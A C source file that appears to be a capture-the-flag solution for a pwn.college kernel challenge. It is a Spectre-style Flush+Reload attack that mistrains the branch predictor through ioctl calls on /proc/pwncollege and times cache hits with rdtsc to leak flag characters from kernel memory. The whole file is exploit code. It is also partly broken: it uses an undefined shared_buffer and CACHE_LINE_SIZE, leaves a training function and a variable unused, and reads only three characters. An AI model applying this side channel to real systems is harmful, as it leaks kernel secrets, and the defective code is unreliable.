#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sched.h>

#define CACHE_HIT_THRESHOLD 120

int fd;
volatile char *mapped_mem;


void serialize_completely() {
    unsigned int eax, ebx, ecx, edx;
    __asm__ volatile ("cpuid"
                     : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
                     : "a" (0)
                     : "memory");
}

// Time how long it takes to access memory
uint64_t time_memory_access(void *addr) {

    _mm_mfence();  
    
    uint64_t start = __rdtsc();
    
    volatile char dummy = *(volatile char*)addr;  // Access the memory
    
    _mm_mfence();  
    
    uint64_t end = __rdtsc();
    
    return end - start;
    
}

void pre_work() {
    serialize_completely();
    
    for (int j = 0; j < 256; j++) {
        uint8_t *addr = (uint8_t*)(shared_buffer + j * CACHE_LINE_SIZE);
        _mm_clflush(addr);
        _mm_clflush(addr);  // Double flush
    }
    
    _mm_mfence();
    _mm_lfence();
    serialize_completely();
}

// Check which page is fastest (in cache)
void post_work(char *best_character, uint64_t *fastest_time) {

    for (int i = 0; i < 95; i++) {
    
    	// mangled the index so that CPU gets confuses and doesn't prefetch
    	int ascii = 32 + ((i * 73) + 13) % 95;
    	
        void *page_addr = (void*)(mapped_mem + ascii * 0x1000);
        
        uint64_t access_time = time_memory_access(page_addr);
        
        // If this is the fastest access, it's probably our character
        if (access_time < *fastest_time) {
        
            *fastest_time = access_time;
            
            *best_character = ascii;
            
        }
    }
}

// Train the branch predictor with valid values
void train_target() {

    for (int i = 0; i < 4000; i++) {

	int mix_i = ((i * 167) + 13) & 255;
        *(volatile uint32_t*)mapped_mem = 5;
        ioctl(fd, 0, 0);
        

    }
}


void speculate(int flag_position) {

	for (int i = 0; i < 3000; i++) {
		*(volatile uint32_t*)mapped_mem = 6 + flag_position;	
		ioctl(fd, 0, 0);
	}

    

}

int main() {
    printf("Starting Flush+Reload attack on kernel module...\n");

    fd = open("/proc/pwncollege", O_RDWR);

    mapped_mem = mmap(NULL, 256 * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    printf("Memory mapped at: %p\n", mapped_mem);
    
    for (int i = 0; i < 256 * 0x1000; i++) {
        mapped_mem[i] = 1;
    }

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
    char recovered_flag[100] = {0};
// Add this in main() before the attack loop
    
    
    // Attack each character position
    for (int pos = 0; pos < 3; pos++) {
        printf("Attacking position %d: ", pos);
        
        char best_character = 0;
        uint64_t fastest_time = 999999;

        for (int attempt = 0; attempt < 1000; attempt++) {

            pre_work();

            speculate(pos);
                                  
            post_work(&best_character, &fastest_time);
        }
        
        recovered_flag[pos] = best_character;
        

        printf("'%c' (time: %lu cycles)\n", best_character, fastest_time);


        if (best_character == 0 || fastest_time > 400) {
			break;
	}
    }
    
    printf("\nRecovered flag: %s\n", recovered_flag);
    
    // Cleanup
    munmap((void*)mapped_mem, 256 * 0x1000);
    close(fd);
    return 0;
}
